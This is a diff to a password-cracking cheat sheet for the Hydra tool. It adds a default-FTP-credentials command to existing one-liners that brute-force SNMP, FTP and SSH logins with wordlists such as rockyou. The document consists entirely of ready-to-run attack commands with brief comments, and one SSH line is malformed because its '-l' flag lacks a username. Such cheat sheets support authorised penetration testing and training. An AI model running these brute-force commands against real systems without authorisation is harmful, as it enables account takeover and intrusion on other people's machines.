@@ -8,6 +8,10 @@ Hydra Password Cracking Cheetsheet
 
 hydra -P password-file.txt -v $ip snmp 					# Hydra brute force against SNMP
 hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp 	# Hydra FTP known user and rockyou password list
+
+# Default FTP credentials
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
+
 hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh 		# Hydra SSH using list of users and passwords
 hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh 			# Hydra SSH using a known password and a username list
 hydra $ip -s 22 ssh -l -P big_wordlist.txt 				# Hydra SSH Against Known username on port 22
